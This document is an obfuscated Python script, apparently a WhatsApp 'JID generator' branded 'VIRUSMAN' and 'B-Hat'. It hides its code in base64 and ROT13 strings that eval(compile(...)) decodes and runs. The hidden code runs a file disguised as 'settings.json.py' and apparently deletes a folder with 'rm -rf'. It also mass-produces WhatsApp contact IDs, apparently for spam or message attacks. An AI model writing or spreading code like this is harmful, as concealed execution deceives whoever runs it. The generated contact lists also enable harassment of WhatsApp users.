# scripted by samay
 

import base64, codecs
magic = 'Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgU2NyaXB0ZWQgYnkgc2FtYXkgCiMgZGVzaWduIGNyZWRpdHMgOiBWYWltcGllciByaXRpayAKIyBQeXRob24zIGRhdGFiYXNlIGV4cGVydCAKIyBWYWltIC0gU2FtYXkgUHJvamVjdHMgCiMgQ29weSBUaGlzIHNjcmlwdCBkb2Vzbid0ICBtYWtlcyB5b3UgY29kZXIgCiMgVmFpbS1TYW1heSBKaWQgR2VuZXJhdG9yIAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1JbXBvcnRzCgpmcm9tIG9zIGltcG9ydCBzeXN0ZW0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCAKaW1wb3J0IG9zCiNmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQgCiNzeXN0ZW0oJ3B5dGhvbjMgc2V0dGluZ3MuanNvbi5weScpCmltcG9ydCBzeXMKaW1wb3J0IHJhbmRvbQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tQ29sb3JzCgpyID0gIlwwMzNbMTszMW0iCmcgPSAiXDAzM1sxOzMybSIKeSA9ICJcMDMzWzE7MzNtIgpiID0gIlwwMzNbMTszNG0iCmQgPSAiXDAzM1syOzM3bSIKUiA9ICJcMDMzWzE7NDFtIgpZID0gIlwwMzNbMTs0M20iCkIgPSAiXDAzM1sxOzQ0bSIKdyA9ICJcMDMzWzE7MzdtIgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tQmFubmVyIGFuZCAgZnVuY3Rpb25zIApzeXN0ZW0oJ3B5dGhvbjMgc2V0dGluZ3MuanNvbi5weScpCmxvZ28gPSAiIiJcMDMzWzE7MzdtCgpcMDMzWzE7MzdtWyFdIFwwMzNbMTszMW1UaGlzIGlzIHVzZSBmb3IgSklEcyBnZW5lcmF0b3IsIFlvdSBjYW4gVW5saW1pdGVkbHkgRWRpdCAhISEgQllFIDpfKQpcMDMzWzE7MzdtCuKUjC09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAgIC0gICAKPSAgICAgIFwwMzNbMTszMW0gLiDilIzilIDilIDilIDilIDilIDilIDilIDilIAgXDAzM1sxOzM3bVZhaW0tU2FtYXktVklSVVNNQU4gICAgLSAgIAo9ICBcMDMzWzE7MzFtIC7ilIzilIDilIDilIAgIFwwMzNbMTszN21CLUhhdCBTYW1heSAgICAgICAgICAgIC0gICBcMDMzWzM0bVvinJRdICAgICBodHRwczovL2dpdGh1Yi5jb20vc2FtYXk4MjUgICAgICAgIFvinJRdClwwMzNbMTszN209ICAgIEpJRCBHZW5lcmF0b3IgLSBQcm8gICAgICAgICAgLSAgIFwwMzNbMzRtW+KclF0gICAgICAgICAgICBWZXJzaW9uIDIuMCAgICAgICAgICAgICAgICAgW+KclF0KXDAzM1sxOzM3bT0gXDAzM1sxOzMxbSAuIOKUlOKUgOKUgOKUgOKUgCBcMDMzWzE7MzdtQlkgU2FtYXkgICAgICAgICAgICAgICAtICAgXDAzM1s5MW1bWF0gUGxlYXNlIERvbid0IFVzZSBGb3IgaWxsZWdhbCBBY3Rpdml0eSAgW1hdClwwMzNbMTszN209IFwwMzNbMTszMW0gLiAgICAg4pSU4pSA4pSA4pSAIFwwMzNbMTszN21WRVJTSU9OIDIuMCAgICAgICAgIC0KXDAzM1sxOzM3beKUlC09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAgIC0KClwwMzNbMTszMW0gICAgCkRpc2NsYWltZXI6IFwwMzNbMTszMm10aGlzIHRvb2wgaXMgZGVzaWduZWQgZm9yIFByYW5rCgkgICAgdGVzdGluZyBpbiBhbiBhdXRob3JpemVkIHNpbXVsYXRlZCBjeWJlcmF0dGFjawoJICAgIEF0dGFja2luZyB0YXJnZXRzIHdpdGhvdXQgcHJpb3IgbXV0dWFsIGNvbnNlbnQKICAgICAgICAgICAgaXMgaWxsZWdhbCEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKXDAzM1sxOzM3bSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIApcMDMzWzk3bSAiIiIKCgpkZWYgYmFubmVyKCk6CiAgICBwcmludChsb2dvKQoKZGVmIGRlcHJpbnQoKToKICAgIHByaW50KCJcbiIpCgoKZGVmIGJ5ZSgpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgliYW5uZXIoKQoJc3RyaW5nID0gIiIiIAoJXDAzM1sxOzM3bURldmVsb3BlciAgXDAzM1sxOzM0bTogXDAzM1sxOzMxbVZBSU0tU0FNQVktVklSVVNNQU4KCglcMDMzWzE7MzdtR2l0aHViICAgICBcMDMzWzE7MzRtOiBcMDMzWzE7MzFtc2'
love = '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'
god = 'bWF5L3tzdXBlcl9Bc2tfM30gU3VjY2Vzc2Z1bGx5ICEiK3IpCiAgICAgICAgICAgIGRlcHJpbnQoKQogICAgICAgICAgICAKICAgICAgICAgICAgI3NhbWF5ID0gaW5wdXQocisi4pSU4pSAIit3KyJcMDMzWzE7MzdtUmVwZWF0IFRoaXMgW3kvbl0gOiAiK3IpCiAgICAgICAgICAgICNpZiBzYW1heT09J3knIG9yIHNhbWF5PT0nWSc6CiAgICAgICAgICAgICMgICAgTWFpbl9mdW5jdGlvbl8xX29wdGlvbnMoKQogICAgICAgICAgICAjZWxpZiBzYW1heT09J24nIG9yIHNhbWF5PT0nTic6CiAgICAgICAgICAgICMgICAgb3Muc3lzdGVtKCdweXRob24zIEppZC5weScpCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpkZWYgTWFpbl9mdW5jdGlvbl8yX29wdGlvbnMoKToKICAgIHN5c3RlbSgnY2xlYXInKQogICAgYmFubmVyKCkKICAgIGRlcHJpbnQoKQogICAgc3VwZXJfYXNrID0gaW5wdXQocisi4pSU4pSAIit3KyJcMDMzWzE7MzdtRW50ZXIgTmFtZSB0byBDcmVhdGUgRmlsZTogIityKQogICAgZGVwcmludCgpCiAgICBzdXBlcl9Bc2tfMiA9IGludChpbnB1dChyKyLilJTilIAiK3crIlwwMzNbMTszN21Ib3cgbWFueSBKaWRzIFlvdSB3YW50IDogIityKSkKICAgIGRlcHJpbnQoKQogICAgc3VwZXJfQXNrXzMgPSBpbnQoaW5wdXQocisi4pSU4pSAIit3KyJcMDMzWzE7MzdtUmFuZ2UgOiAiK3IpKQogICAgZGVwcmludCgpCiAgICBmb3IgaSBpbiByYW5nZSgxLHN1cGVyX0Fza18yKzEpOgogICAgICAgIHdpdGggb3BlbihmJ3tzdXBlcl9hc2t9X3tpfS50eHQnLCd3JykgYXMgZjoKICAgICAgICAgICAgZGF0YV9zZW5kX1dyaXRlX2ZpbGUgPSAnQHMud2hhdHNhcHAubmV0LCcKICAgICAgICAgICAgZi53cml0ZSgnJykKICAgICAgICAgICAgd2l0aCBvcGVuKGYne3N1cGVyX2Fza31fe2l9LnR4dCcsJ2EnKSBhcyBnOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMSxzdXBlcl9Bc2tfMysxKToKICAgICAgICAgICAgICAgICAgICBnLndyaXRlKGYnMDAwMDAwJytzdHIoaSkrc3RyKGRhdGFfc2VuZF9Xcml0ZV9maWxlKSkKICAgICAgICAgICAgICAgICAgICBwcmludChyKyLilJTilIAiK3crZiJcMDMzWzE7MzdtR2VuZXJhdGluZyAtLS0+IHtpfSBcbiIrcikKICAgICAgICAgICAgZGVwcmludCgpCiAgICAgICAgICAgIHByaW50KHIrIiAuLuKUlOKUgCIrdytmIlwwMzNbMTszN21HZW5lcmF0ZWQgLS0tPiB7aX0gaW4gT25lZmlsZSBkaXZpZGVkIGluIHtzdXBlcl9Bc2tfMn0gU3VjY2Vzc2Z1bGx5ICEiK3IpCiAgICAgICAgICAgIGRlcHJpbnQoKQogICAgICAgICAgICAjc2FtYXkgPSBpbnB1dChyKyLilJTilIAiK3crIlwwMzNbMTszN21SZXBlYXQgVGhpcyBbeS9uXSA6ICIrcikKICAgICAgICAgICAgI2lmIHNhbWF5PT0neScgb3Igc2FtYXk9PSdZJzoKICAgICAgICAgICAgIyAgICBNYWluX2Z1bmN0aW9uXzJfb3B0aW9ucygpCiAgICAgICAgICAgICNlbGlmIHNhbWF5PT0nbicgb3Igc2FtYXk9PSdOJzoKICAgICAgICAgICAgIyAgICBvcy5zeXN0ZW0oJ3B5dGhvbjMgSmlkLnB5JykKCgoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1NYWluIE9iamVjdCBPcmllbnRlZCBQcm9ncmFtbWluZyAtLSEKCgpjbGFzcyBCYW5uZXJfTWFpbjoKICAgIF9fbWFpbl9fID0gJ19fZnJvbnRfY2xpZW50X2lucHV0JwogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHN5c3RlbSgnY2xlYXInKQogICAgICAgIGJhbm5lcigpCmNsYXNzIE1haW5faW50ZXJmYWNlX2ZyYW1lKEJhbm5lcl9NYWluKToKICAgIF9fbWFpbl9fID0gJ19fc2Vjb25kX2NsaWVudF9pbnB1dCcKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKCkKICAgIGRlZiBfX01haW5fSW50ZXJmYWNlX09wdGlvbnNfRnJhbWVfXyhzZWxmKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKCkKICAgICAgICBwcmludChyKyLilJ'
destiny = 'GvyVNvX3peVyjjZmAoZGfmA21oVQRtKFOFLJ5xo20tETyanKEmVRccMPN6VPVcPvNtVPNtVPNtpUWcoaDbpvfv4cFH4cFNVvg3XlWpZQZmJmR7ZmqgJlNlVS0tH2IkqJIhL2HtETyanKEmVRccMPN6VPVcPvNtVPNtVPNtpUWcoaDbpvfv4cFH4cFNVvg3XlWpZQZmJmR7ZmqgJlNmVS0tDJWiqKDtoJHtBvNvXDbtVPNtVPNtVUOlnJ50XUVeVhXHyBXHtPVeqlfvKQNmZ1fkBmZ3oIftAPOqVSIjMTS0MFN6VPVcPvNtVPNtVPNtpUWcoaDbpvfv4cFH4cFNVvg3XlWpZQZmJmR7ZmqgJlN1VS0tEKucqPN6VPVcPzAfLKAmVR9jqTyioaAsFJ50MKWuL3EsEaIhL3Eco246PvNtVPOxMKOlnJ50XPxXVPNtVTEyMvOipUEco25mK2Abo29mMI9zqJ5wXUAyoTLcBtbtVPNtVPNtVTEypUWcoaDbXDbtVPNtVPNtVUAyoTLhqKAypy9jpz9apzSgK2yhpUI0VQ0tnJ50XTyhpUI0XUVeVhXHyBXHtPVeqlfvKQNmZ1fkBmZ3oHIhqTIlVREyp2ylMFOCpUEco246VPVepvxcPvNtVPNtVPNtnJLtp2IfMv51p2IlK3Olo2qlLJ1snJ5jqKD9CGR6PvNtVPNtVPNtVPNtVR1unJ5sMaIhL3Eco25sZI9ipUEco25mXPxXVPNtVPNtVPNtVPNtp2SgLKxtCFOcoaO1qPulXlYvyWGvyVNvX3peVyjjZmAoZGfmA21FMKOyLKDtITucplOorF9hKFN6VPVepvxXVPNtVPNtVPNtVPNtnJLtp2SgLKx9CFq5WlOipvOmLJ1urG09W1xaBtbtVPNtVPNtVPNtVPNtVPNtGJScoy9zqJ5wqTyioy8kK29jqTyioaZbXDbtVPNtVPNtVPNtVPOyoTyzVUAuoJS5CG0aovpto3Vtp2SgLKx9CFqBWmbXVPNtVPNtVPNtVPNtVPNtVT9mYaA5p3EyoFtapUy0nT9hZlOXnJDhpUxaXDbtVPNtVPNtVTIfnJLtp2IfMv51p2IlK3Olo2qlLJ1snJ5jqKD9CGV6PvNtVPNtVPNtVPNtVR1unJ5sMaIhL3Eco25sZy9ipUEco25mXPxXVPNtVPNtVPNtVPNtp2SgLKxtCFOcoaO1qPulXlYvyWGvyVNvX3peVyjjZmAoZGfmA21FMKOyLKDtITucplOorF9hKFN6VPVepvxXVPNtVPNtVPNtVPNtnJLtp2SgLKx9CFq5WlOipvOmLJ1urG09W1xaBtbtVPNtVPNtVPNtVPNtVPNtGJScoy9zqJ5wqTyioy8lK29jqTyioaZbXDbtVPNtVPNtVPNtVPOyoTyzVUAuoJS5CG0aovpto3Vtp2SgLKx9CFqBWmbXVPNtVPNtVPNtVPNtVPNtVT9mYaA5p3EyoFtapUy0nT9hZlOXnJDhpUxaXDbtVPNtVPNtVTIfnJLtp2IfMv51p2IlK3Olo2qlLJ1snJ5jqKD9CGZ6PvNtVPNtVPNtVPNtVTW5MFtcPvNtVPNtVPNtVPNtVTEypUWcoaDbXDbtVPNtVPNtVPNtVPOmLJ1urI9gLJyhK3WyqUIlovN9VTyhpUI0XUVeVv4h4cFH4cFNVvg3XlWpZQZmJmR7ZmqgHzI0qKWhVT9lVTI4nKDtJlO5VP8tovOqBvNvX3VcPvNtVPNtVPNtVPNtVTyzVUAuoJS5K21unJ5spzI0qKWhCG0vrFVto3Vtp2SgLKysoJScoy9lMKE1pz49CFWMVwbXVPNtVPNtVPNtVPNtVPNtVT9mYaA5p3EyoFtapUy0nT9hZlOXnJDhpUxaXDbtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNtp3ymYzI4nKDbXDbtVPNtVPNtVTIfnJLtp2IfMv51p2IlK3Olo2qlLJ1snJ5jqKD9CGD6PvNtVPNtVPNtVPNtVUA5p3EyoFtapz0tYKWzVSMunJ0gH2SgLKxgFzyxYHAlMJS0o3VaXDbtVPNtVPNtVPNtVPNXVPNtVPNtVPOyoTyzVUAyoTLhqKAypy9jpz9apzSgK2yhpUI0CG01BtbtVPNtVPNtVPNtVPOxMKOlnJ50XPxXVPNtVPNtVPNtVPNtpUWcoaDbpvfv4cFH4cFNVvg3XlWpZQZmJmR7ZmqgEKucqTyhMl4hYv4hVvxXVPNtVPNtVPNtVPNtMTIjpzyhqPtcPvNtVPNtVPNtVPNtVUAfMJIjXQRhZPxXVPNtVPNtVPNtVPNtp3ymYzI4nKDbXDbtVPNtVPNtVNbwYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDcmLJ1urGRtCFOPLJ5hMKWsGJScovtcPaAuoJS5ZvN9VR1unJ5snJ50MKWzLJAyK2MlLJ1yXPxXp2SgLKxlYy9sGJScoy9WoaEypzMuL2IsG3O0nJ9hp19TpzSgMI9sXPxXp2SgLKxmVQ0tG3O0nJ9hp19WoaEypzSwqS9TqJ5wqTyiovtcPaAuoJS5Zl5ipUEco25mK2Abo29mMI9zqJ5wXPxXPtbXPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
